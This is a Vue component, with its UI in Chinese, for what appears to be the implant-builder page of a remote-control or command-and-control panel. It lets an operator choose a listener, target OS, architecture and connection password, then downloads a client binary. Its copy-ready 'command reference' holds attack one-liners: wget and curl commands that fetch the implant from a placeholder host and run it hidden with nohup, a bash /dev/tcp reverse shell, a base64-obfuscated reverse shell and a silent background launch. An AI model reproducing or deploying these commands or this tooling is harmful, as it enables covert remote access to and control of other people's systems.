<template>
  <div class="client-generator">
    <!-- 头部区域 -->
    <div class="header-section">
      <div class="header-content">
        <h1 class="page-title">客户端生成</h1>
        <p class="page-subtitle">配置并生成适用于不同系统的远程客户端</p>
      </div>
      <div class="header-stats">
        <div class="stat-item">
          <el-icon class="stat-icon platform-icon"><Monitor /></el-icon>
          <div class="stat-info">
            <div class="stat-value">{{ platformCount }}</div>
            <div class="stat-label">支持平台</div>
          </div>
        </div>
        <div class="stat-item">
          <el-icon class="stat-icon arch-icon"><Cpu /></el-icon>
          <div class="stat-info">
            <div class="stat-value">{{ archCount }}</div>
            <div class="stat-label">架构类型</div>
          </div>
        </div>
      </div>
    </div>

    <!-- 生成配置卡片 -->
    <el-card class="config-card" shadow="hover">
      <template #header>
        <div class="card-header">
          <div class="header-left">
            <el-icon class="card-icon"><Setting /></el-icon>
            <h3 class="card-title">生成配置</h3>
          </div>
          <div class="header-right">
            <el-tag type="success" size="small">实时生成</el-tag>
          </div>
        </div>
      </template>

      <div class="config-form">
        <el-form :model="formData" label-position="top" class="generator-form">
          <!-- Listener 选择 -->
          <el-form-item label="监听器" required>
            <el-select
                v-model="formData.listener"
                placeholder="选择监听器"
                class="form-select"
                @visible-change="handleDropdown"
                :loading="loadingListeners"
                clearable
                filterable
            >
              <template #prefix>
                <el-icon><Connection /></el-icon>
              </template>
              <el-option
                  v-for="item in listenerOptions"
                  :key="item"
                  :label="item"
                  :value="item"
              >
                <div class="listener-option">
                  <el-icon class="option-icon"><Connection /></el-icon>
                  <span class="option-label">{{ item }}</span>
                </div>
              </el-option>
              <template #empty>
                <div class="empty-option">暂无可用监听器</div>
              </template>
            </el-select>
            <div class="form-hint">选择客户端连接的监听器地址</div>
          </el-form-item>

          <!-- 操作系统选择 -->
          <el-form-item label="操作系统" required>
            <div class="os-selector">
              <div
                  v-for="os in osOptions"
                  :key="os.value"
                  class="os-option"
                  :class="{ 'os-selected': formData.os === os.value }"
                  @click="selectOS(os.value)"
              >
                <div class="os-icon-wrapper">
                  <el-icon :class="['os-icon', `os-${os.value}`]">
                    <component :is="os.icon" />
                  </el-icon>
                </div>
                <div class="os-info">
                  <div class="os-name">{{ os.label }}</div>
                  <div class="os-arch-count">
                    {{ archMapping[os.value]?.length || 0 }} 种架构
                  </div>
                </div>
                <el-icon
                    v-if="formData.os === os.value"
                    class="os-check"
                >
                  <Check />
                </el-icon>
              </div>
            </div>
          </el-form-item>

          <!-- 架构选择 -->
          <el-form-item label="系统架构" required>
            <div class="arch-grid">
              <div
                  v-for="arch in archOptions"
                  :key="arch"
                  class="arch-option"
                  :class="{
                  'arch-selected': formData.arch === arch,
                  'arch-disabled': !formData.os
                }"
                  @click="formData.os && selectArch(arch)"
              >
                <div class="arch-icon">
                  <el-icon class="arch-icon-svg"><Cpu /></el-icon>
                </div>
                <div class="arch-info">
                  <div class="arch-name">{{ arch.toUpperCase() }}</div>
                  <div class="arch-desc">{{ getArchDescription(arch) }}</div>
                </div>
              </div>
            </div>
            <div class="form-hint">根据目标系统选择合适的处理器架构</div>
          </el-form-item>

          <!-- 上线密码 -->
          <el-form-item label="连接密码">
            <div class="password-input-wrapper">
              <el-input
                  v-model="formData.pass"
                  placeholder="输入客户端连接密码"
                  type="password"
                  show-password
                  clearable
                  class="password-input"
                  :maxlength="32"
              >
                <template #prefix>
                  <el-icon><Lock /></el-icon>
                </template>
              </el-input>
              <el-tooltip content="生成随机密码" placement="top">
                <el-button
                    class="generate-password-btn"
                    @click="generateRandomPassword"
                    :icon="Refresh"
                    circle
                    size="small"
                />
              </el-tooltip>
            </div>
            <div class="form-hint">客户端连接时使用的验证密码（可选，8-32位字符）</div>
            <div v-if="formData.pass" class="password-strength">
              <div class="strength-meter">
                <div
                    class="strength-bar"
                    :style="{ width: `${passwordStrength}%` }"
                ></div>
              </div>
              <span class="strength-text">密码强度：{{ passwordStrengthText }}</span>
            </div>
          </el-form-item>

          <!-- 生成按钮 -->
          <el-form-item>
            <el-button
                type="primary"
                @click="handleGenerate"
                :disabled="!isFormValid"
                :loading="generating"
                class="generate-btn"
                size="large"
            >
              <el-icon><Download /></el-icon>
              生成客户端
            </el-button>
            <div class="form-hint" v-if="isFormValid">
              将生成 {{ getFileName() }} 客户端文件
            </div>
          </el-form-item>
        </el-form>
      </div>
    </el-card>

    <!-- 使用命令参考 -->
    <el-card class="commands-card" shadow="hover">
      <template #header>
        <div class="card-header">
          <div class="header-left">
            <el-icon class="card-icon"><Promotion /></el-icon>
            <h3 class="card-title">使用命令参考</h3>
          </div>
          <div class="header-right">
            <el-tooltip content="复制所有命令" placement="top">
              <el-button
                  type="info"
                  size="small"
                  :icon="CopyDocument"
                  @click="copyAllCommands"
              >
                一键复制
              </el-button>
            </el-tooltip>
          </div>
        </div>
      </template>

      <div class="commands-grid">
        <div
            v-for="(cmd, index) in commands"
            :key="index"
            class="command-card"
            :class="`command-type-${index % 4}`"
        >
          <div class="command-header">
            <div class="command-type">
              <el-icon class="type-icon">
                <component :is="cmd.icon" />
              </el-icon>
              <span class="type-name">{{ cmd.name }}</span>
            </div>
            <el-tooltip content="复制命令" placement="top">
              <el-button
                  type="text"
                  :icon="CopyDocument"
                  @click="copyToClipboard(cmd.code)"
                  class="copy-btn"
              />
            </el-tooltip>
          </div>
          <div class="command-content">
            <pre class="command-code">{{ cmd.code }}</pre>
            <div class="command-desc">{{ cmd.description }}</div>
          </div>
        </div>
      </div>
    </el-card>

<!--    &lt;!&ndash; 帮助提示 &ndash;&gt;-->
<!--    <el-card class="help-card" shadow="never">-->
<!--      <div class="help-content">-->
<!--        <el-icon class="help-icon"><InfoFilled /></el-icon>-->
<!--        <div class="help-text">-->
<!--          <h4>生成说明</h4>-->
<!--          <p>-->
<!--            1. 客户端文件为独立可执行程序，无需额外依赖<br>-->
<!--            2. 请确保目标系统与选择的架构相匹配<br>-->
<!--            3. 连接密码用于客户端身份验证，请妥善保管<br>-->
<!--            4. Windows 客户端会自动添加 .exe 扩展名-->
<!--          </p>-->
<!--        </div>-->
<!--      </div>-->
<!--    </el-card>-->
  </div>
</template>

<script setup lang="ts">
import { reactive, ref, computed, onMounted } from 'vue';
import { ElMessage, ElMessageBox } from 'element-plus';
import {
  Monitor,
  Cpu,
  Setting,
  Connection,
  Check,
  Lock,
  Refresh,
  Download,
  CopyDocument,
  Promotion,
  InfoFilled,
  Apple,
  MagicStick,
  Odometer,
  ChatLineSquare,
  SwitchButton
} from '@element-plus/icons-vue';
import ClientAPI from "@/api/clients";

// 操作系统选项
const osOptions = [
  { label: 'Windows', value: 'windows', icon: Monitor },
  { label: 'Linux', value: 'linux', icon: Monitor },
  { label: 'macOS', value: 'darwin', icon: Monitor }
];

// 架构映射
const archMapping: Record<string, string[]> = {
  windows: ['amd64', '386'],
  linux: ['amd64', '386', 'arm', 'arm64', 'loong64', 'mips', 'mipsle', 'mips64', 'mips64le'],
  darwin: ['amd64', 'arm64']
};

// 架构描述
const archDescriptions: Record<string, string> = {
  'amd64': '64位 x86 架构 (Intel/AMD)',
  '386': '32位 x86 架构',
  'arm': 'ARM 架构 (32位)',
  'arm64': 'ARM 64位架构',
  'loong64': '龙芯架构',
  'mips': 'MIPS 架构 (大端)',
  'mipsle': 'MIPS 架构 (小端)',
  'mips64': 'MIPS 64位 (大端)',
  'mips64le': 'MIPS 64位 (小端)'
};

// 状态
const listenerOptions = ref<string[]>([]);
const loadingListeners = ref(false);
const generating = ref(false);

// 表单数据
const formData = reactive({
  listener: '',
  os: '',
  arch: '',
  pass: ''
});

// 架构选项
const archOptions = ref<string[]>([]);

// 计算属性
const platformCount = computed(() => osOptions.length);
const archCount = computed(() => {
  let total = 0;
  Object.values(archMapping).forEach(arr => total += arr.length);
  return total;
});

const isFormValid = computed(() => {
  return formData.listener && formData.os && formData.arch;
});

const passwordStrength = computed(() => {
  if (!formData.pass) return 0;

  let score = 0;
  // 长度
  if (formData.pass.length >= 8) score += 20;
  if (formData.pass.length >= 12) score += 20;
  // 复杂度
  if (/[a-z]/.test(formData.pass)) score += 20;
  if (/[A-Z]/.test(formData.pass)) score += 20;
  if (/[0-9]/.test(formData.pass)) score += 20;
  if (/[^a-zA-Z0-9]/.test(formData.pass)) score += 20;

  return Math.min(score, 100);
});

const passwordStrengthText = computed(() => {
  const strength = passwordStrength.value;
  if (strength <= 40) return '弱';
  if (strength <= 70) return '中';
  return '强';
});

// 命令参考
const commands = [
  {
    name: '直接运行',
    code: './r_linux_amd64 [上线密码]',
    description: '直接运行客户端程序',
    icon: Odometer
  },
  {
    name: 'Wget下载',
    code: 'wget -P /tmp http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [上线密码] > m.log 2>&1 &',
    description: '使用 wget 下载并运行',
    icon: Download
  },
  {
    name: 'Curl下载',
    code: 'curl -o /tmp/r_linux_amd64 http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [上线密码] > m.log 2>&1 &',
    description: '使用 curl 下载并运行',
    icon: Download
  },
  {
    name: 'Bash反弹',
    code: 'bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1',
    description: 'Bash 反弹 Shell',
    icon: ChatLineSquare
  },
  {
    name: 'Base64反弹',
    code: 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMjMzMyAwPiYx}|{base64,-d}|{bash,-i}',
    description: 'Base64 编码的反弹 Shell',
    icon: MagicStick
  },
  {
    name: '后台运行',
    code: 'nohup ./client [密码] > /dev/null 2>&1 &',
    description: '在后台静默运行客户端',
    icon: SwitchButton
  }
];

// 方法
const getArchDescription = (arch: string) => {
  return archDescriptions[arch] || '未知架构';
};

const getFileName = () => {
  if (!formData.os || !formData.arch) return '';
  let fileName = `r_${formData.os}_${formData.arch}`;
  if (formData.os === 'windows') fileName += '.exe';
  return fileName;
};

const handleDropdown = async (visible: boolean) => {
  if (visible && listenerOptions.value.length === 0) {
    loadingListeners.value = true;
    try {
      const res = await ClientAPI.ShowListener();
      if (res.status === 200 && res.data.status === 200) {
        listenerOptions.value = res.data.data;
      } else {
        ElMessage.error(res.data?.data || '获取监听器列表失败');
      }
    } catch (error) {
      console.error('获取监听器失败:', error);
      ElMessage.error('获取监听器列表失败');
    } finally {
      loadingListeners.value = false;
    }
  }
};

const selectOS = (os: string) => {
  formData.os = os;
  formData.arch = '';
  archOptions.value = archMapping[os] || [];
};

const selectArch = (arch: string) => {
  formData.arch = arch;
};

const generateRandomPassword = () => {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
  let password = '';
  for (let i = 0; i < 16; i++) {
    password += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  formData.pass = password;
  ElMessage.success('已生成随机密码');
};

const handleGenerate = async () => {
  if (!isFormValid.value) {
    ElMessage.warning('请填写完整的配置信息');
    return;
  }

  generating.value = true;
  try {
    const res = await ClientAPI.GenServer({
      osType: formData.os,
      archType: formData.arch,
      listener: formData.listener,
      pass: formData.pass
    });

    if (res.status === 200) {
      // 获取文件名
      const contentDisposition = res.headers['content-disposition'] || '';
      const matches = /filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(contentDisposition);
      let fileName = matches && matches.length > 1
          ? decodeURIComponent(matches[1].replace(/['"]/g, ''))
          : getFileName();

      // 创建下载
      const blob = new Blob([res.data], { type: res.headers['content-type'] });
      const downloadElement = document.createElement('a');
      const href = window.URL.createObjectURL(blob);

      downloadElement.href = href;
      downloadElement.download = fileName;
      document.body.appendChild(downloadElement);
      downloadElement.click();
      document.body.removeChild(downloadElement);
      window.URL.revokeObjectURL(href);

      ElMessage.success('客户端生成成功，开始下载');
    } else {
      ElMessage.error('生成失败，请稍后重试');
    }
  } catch (error: any) {
    console.error('生成失败:', error);
    ElMessage.error(error.message || '生成客户端失败');
  } finally {
    generating.value = false;
  }
};

const copyToClipboard = (text: string) => {
  navigator.clipboard.writeText(text).then(() => {
    ElMessage.success('命令已复制到剪贴板');
  }).catch(() => {
    ElMessage.error('复制失败，请手动复制');
  });
};

const copyAllCommands = () => {
  const allCommands = commands.map(cmd => `# ${cmd.name}\n${cmd.code}\n`).join('\n');
  copyToClipboard(allCommands);
};

// 初始化
onMounted(() => {
  // 默认选择第一个操作系统
  selectOS('windows');
});
</script>

<style scoped>
.client-generator {
  padding: 24px;
  background: linear-gradient(135deg, #f5f7fa 0%, #e4e7ed 100%);
  min-height: calc(100vh - 60px);
}

.header-section {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 32px;
  flex-wrap: wrap;
  gap: 20px;
}

.header-content {
  flex: 1;
}

.page-title {
  margin: 0;
  font-size: 32px;
  font-weight: 700;
  color: #2c3e50;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  letter-spacing: 1px;
}

.page-subtitle {
  margin: 8px 0 0 0;
  font-size: 15px;
  color: #7f8c8d;
}

.header-stats {
  display: flex;
  gap: 24px;
}

.stat-item {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 16px 24px;
  background: white;
  border-radius: 12px;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
  border: 1px solid #ebeef5;
  transition: all 0.3s;
}

.stat-item:hover {
  transform: translateY(-2px);
  box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
}

.stat-icon {
  width: 40px;
  height: 40px;
  border-radius: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 20px;
}

.platform-icon {
  background: rgba(64, 158, 255, 0.1);
  color: #409eff;
}

.arch-icon {
  background: rgba(103, 194, 58, 0.1);
  color: #67c23a;
}

.stat-info {
  display: flex;
  flex-direction: column;
}

.stat-value {
  font-size: 24px;
  font-weight: 700;
  color: #2c3e50;
  line-height: 1;
}

.stat-label {
  font-size: 13px;
  color: #7f8c8d;
  margin-top: 4px;
}

/* 配置卡片样式 */
.config-card {
  border-radius: 16px;
  border: 1px solid #ebeef5;
  margin-bottom: 24px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08) !important;
}

.config-card :deep(.el-card__header) {
  border-bottom: 1px solid #ebeef5;
  padding: 20px 24px;
  background: linear-gradient(90deg, #f8f9fa 0%, #fff 100%);
}

.card-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.header-left {
  display: flex;
  align-items: center;
  gap: 12px;
}

.card-icon {
  color: #409eff;
  font-size: 20px;
}

.card-title {
  margin: 0;
  font-size: 18px;
  font-weight: 600;
  color: #303133;
}

.config-form {
  padding: 8px 4px;
}

.generator-form :deep(.el-form-item) {
  margin-bottom: 32px;
}

.generator-form :deep(.el-form-item__label) {
  font-size: 15px;
  font-weight: 600;
  color: #2c3e50;
  padding-bottom: 12px;
  display: block;
}

/* 表单选择器 */
.form-select {
  width: 100%;
}

.form-select :deep(.el-input__wrapper) {
  border-radius: 10px;
  padding-left: 12px;
  height: 48px;
}

.form-select :deep(.el-input__prefix) {
  display: flex;
  align-items: center;
  padding-left: 12px;
}

.listener-option {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 8px 0;
}

.option-icon {
  color: #409eff;
  font-size: 16px;
}

.option-label {
  font-size: 14px;
  font-weight: 500;
}

.empty-option {
  text-align: center;
  padding: 20px;
  color: #909399;
  font-size: 14px;
}

/* 操作系统选择器 */
.os-selector {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 16px;
}

.os-option {
  display: flex;
  align-items: center;
  gap: 16px;
  padding: 20px;
  border: 2px solid #e9ecef;
  border-radius: 12px;
  cursor: pointer;
  transition: all 0.3s;
  background: #f8f9fa;
  position: relative;
}

.os-option:hover {
  border-color: #409eff;
  background: rgba(64, 158, 255, 0.05);
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
}

.os-selected {
  border-color: #409eff !important;
  background: rgba(64, 158, 255, 0.1) !important;
  box-shadow: 0 4px 12px rgba(64, 158, 255, 0.2);
}

.os-icon-wrapper {
  width: 48px;
  height: 48px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.os-icon {
  font-size: 24px;
}

.os-windows {
  color: #00a4ef;
}

.os-linux {
  color: #333;
}

.os-darwin {
  color: #999;
}

.os-info {
  flex: 1;
  min-width: 0;
}

.os-name {
  font-size: 16px;
  font-weight: 600;
  color: #2c3e50;
  margin-bottom: 4px;
}

.os-arch-count {
  font-size: 13px;
  color: #6c757d;
}

.os-check {
  color: #409eff;
  font-size: 20px;
}

/* 架构选择器 */
.arch-grid {
  display: flex;
  flex-wrap: wrap;
  gap: 12px;
}

.arch-option {
  flex: 0 0 auto;
  min-width: 180px;
  padding: 16px;
  border: 2px solid #e9ecef;
  border-radius: 10px;
  cursor: pointer;
  transition: all 0.3s;
  background: #f8f9fa;
  display: flex;
  align-items: center;
  gap: 12px;
}

.arch-option:hover:not(.arch-disabled) {
  border-color: #409eff;
  background: rgba(64, 158, 255, 0.05);
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
}

.arch-selected {
  border-color: #67c23a !important;
  background: rgba(103, 194, 58, 0.1) !important;
  box-shadow: 0 4px 12px rgba(103, 194, 58, 0.2);
}

.arch-disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.arch-icon {
  width: 40px;
  height: 40px;
  border-radius: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
  background: rgba(64, 158, 255, 0.1);
}

.arch-icon-svg {
  color: #409eff;
  font-size: 20px;
}

.arch-info {
  flex: 1;
  min-width: 0;
}

.arch-name {
  font-size: 14px;
  font-weight: 600;
  color: #2c3e50;
  margin-bottom: 2px;
}

.arch-desc {
  font-size: 11px;
  color: #6c757d;
  line-height: 1.3;
}

/* 密码输入框 */
.password-input-wrapper {
  display: flex;
  gap: 12px;
  align-items: center;
}

.password-input {
  flex: 1;
}

.password-input :deep(.el-input__wrapper) {
  border-radius: 10px;
  height: 48px;
}

.generate-password-btn {
  flex-shrink: 0;
}

.password-strength {
  margin-top: 12px;
}

.strength-meter {
  height: 6px;
  background: #e9ecef;
  border-radius: 3px;
  overflow: hidden;
  margin-bottom: 6px;
}

.strength-bar {
  height: 100%;
  background: linear-gradient(90deg, #f56c6c, #e6a23c, #67c23a);
  border-radius: 3px;
  transition: width 0.3s;
}

.strength-text {
  font-size: 12px;
  color: #6c757d;
}

/* 生成按钮 */
.generate-btn {
  height: 52px;
  padding: 0 40px;
  border-radius: 12px;
  font-size: 16px;
  font-weight: 600;
  box-shadow: 0 4px 12px rgba(64, 158, 255, 0.3);
  transition: all 0.3s;
}

.generate-btn:hover:not(:disabled) {
  transform: translateY(-2px);
  box-shadow: 0 6px 20px rgba(64, 158, 255, 0.4);
}

.generate-btn .el-icon {
  margin-right: 8px;
  font-size: 18px;
}

/* 命令参考卡片 */
.commands-card {
  border-radius: 16px;
  border: 1px solid #ebeef5;
  margin-bottom: 24px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08) !important;
}

.commands-card :deep(.el-card__header) {
  border-bottom: 1px solid #ebeef5;
  padding: 20px 24px;
  background: linear-gradient(90deg, #f8f9fa 0%, #fff 100%);
}

.commands-grid {
  display: flex;
  flex-direction: column;
  gap: 20px;
  padding: 8px 4px;
}

.command-card {
  width: 95%;
  padding: 20px;
  border-radius: 12px;
  border: 1px solid #e9ecef;
  transition: all 0.3s;
  background: #f8f9fa;
}

.command-card:hover {
  transform: translateY(-2px);
  box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
}

.command-card.command-type-0 { border-left: 4px solid #409eff; }
.command-card.command-type-1 { border-left: 4px solid #67c23a; }
.command-card.command-type-2 { border-left: 4px solid #e6a23c; }
.command-card.command-type-3 { border-left: 4px solid #f56c6c; }

.command-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 16px;
}

.command-type {
  display: flex;
  align-items: center;
  gap: 8px;
}

.type-icon {
  font-size: 18px;
  color: #409eff;
}

.type-name {
  font-size: 16px;
  font-weight: 600;
  color: #2c3e50;
}

.copy-btn {
  color: #909399;
  transition: color 0.3s;
}

.copy-btn:hover {
  color: #409eff;
}

.command-content {
  position: relative;
}

.command-code {
  background: #2d2d2d;
  color: #f8f8f2;
  padding: 16px;
  border-radius: 8px;
  font-family: 'Monaco', 'Consolas', monospace;
  font-size: 13px;
  line-height: 1.5;
  overflow-x: auto;
  margin-bottom: 12px;
  white-space: pre-wrap;
  word-break: break-all;
}

.command-desc {
  font-size: 12px;
  color: #6c757d;
  line-height: 1.4;
}

/* 帮助卡片 */
.help-card {
  border-radius: 16px;
  border: 1px solid #ebeef5;
  background: rgba(64, 158, 255, 0.03);
}

.help-content {
  display: flex;
  gap: 16px;
  padding: 20px;
}

.help-icon {
  color: #409eff;
  font-size: 24px;
  flex-shrink: 0;
  margin-top: 4px;
}

.help-text {
  flex: 1;
}

.help-text h4 {
  margin: 0 0 12px 0;
  font-size: 16px;
  font-weight: 600;
  color: #2c3e50;
}

.help-text p {
  margin: 0;
  font-size: 14px;
  color: #5a5e66;
  line-height: 1.6;
}

.form-hint {
  font-size: 12px;
  color: #6c757d;
  margin-top: 8px;
  padding-left: 4px;
}

/* 响应式设计 */
@media (max-width: 992px) {
  .os-selector {
    grid-template-columns: 1fr;
  }

  .arch-grid {
    grid-template-columns: repeat(2, 1fr);
  }

}

@media (max-width: 768px) {
  .client-generator {
    padding: 16px;
  }

  .header-section {
    flex-direction: column;
    align-items: stretch;
  }

  .header-stats {
    width: 100%;
    justify-content: space-between;
  }

  .stat-item {
    flex: 1;
    justify-content: center;
  }

  .arch-grid {
    grid-template-columns: 1fr;
  }

  .commands-grid {
    grid-template-columns: 1fr;
  }

  .generate-btn {
    width: 100%;
  }
}

@media (max-width: 480px) {
  .password-input-wrapper {
    flex-direction: column;
    align-items: stretch;
  }

  .generate-password-btn {
    align-self: flex-end;
  }
}
</style>